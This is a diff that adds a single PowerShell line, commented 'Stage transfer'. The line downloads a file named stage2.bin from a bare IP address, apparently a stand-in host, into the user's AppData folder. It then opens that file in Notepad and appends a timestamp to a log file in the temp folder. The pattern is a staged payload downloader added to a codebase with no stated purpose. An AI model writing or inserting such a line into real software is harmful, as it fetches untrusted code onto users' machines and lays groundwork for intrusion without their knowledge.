@@ -1,0 +1,1 @@
+<# Stage transfer #> $RemoteUrl = 'http://198.51.100.113/cdn/stage2.bin'; $DownloadPath = "$env:APPDATA\stage2.bin"; (New-Object System.Net.WebClient).DownloadFile($RemoteUrl, $DownloadPath); Start-Process -FilePath "notepad.exe" -ArgumentList $DownloadPath; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
